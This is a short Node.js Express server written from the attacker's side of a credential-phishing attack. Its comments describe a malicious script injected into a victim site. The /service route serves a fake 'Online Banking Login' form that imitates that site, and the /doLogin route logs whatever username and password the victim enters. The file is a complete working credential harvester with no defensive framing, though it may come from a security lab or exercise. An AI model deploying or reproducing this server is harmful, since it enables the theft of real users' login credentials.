const app = require("express")();
const cors = require("cors");
const bodyParser = require("body-parser");

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());
/*
    Gets called when site is open with the malicious script.
    This API returns a mock login form similar to victim site. 
*/
app.get("/service", (req, res, next)=>{
    let a = `<div class="fl" style="width: 99%;">

    <h1>Online Banking Login</h1>

    <!-- To get the latest admin login, please contact SiteOps at 415-555-6159 -->
    <p><span id="_ctl0__ctl0_Content_Main_message" style="color:#FF0066;font-size:12pt;font-weight:bold;">

        </span></p>

    <form action="doLogin" method="post" name="login" id="login" onsubmit="return (window.onLogin(login));">
        <table>
            <tbody>
                <tr>
                    <td>
                        Username:
                    </td>
                    <td>
                        <input type="text" id="uid" name="uid" value="" style="width: 150px;">
                    </td>
                    <td>
                    </td>
                </tr>
                <tr>
                    <td>
                        Password:
                    </td>
                    <td>
                        <input type="password" id="passw" name="passw" style="width: 150px;">
                    </td>
                </tr>
                <tr>
                    <td></td>
                    <td>
                        <input type="submit" name="btnSubmit" value="Login">
                    </td>
                </tr>
            </tbody>
        </table>
    </form>

</div>`;
    res.send(a);
})
/*
    This API runs when our user inputs his/her username/password in our malicious page.
    It fetches username and password of our victim.
*/
app.post("/doLogin", (req, res, next)=>{
    console.log(req.body);
    res.sendStatus(200);
});


app.listen(3000, ()=>{
    console.log("Server Listening at 3000");
})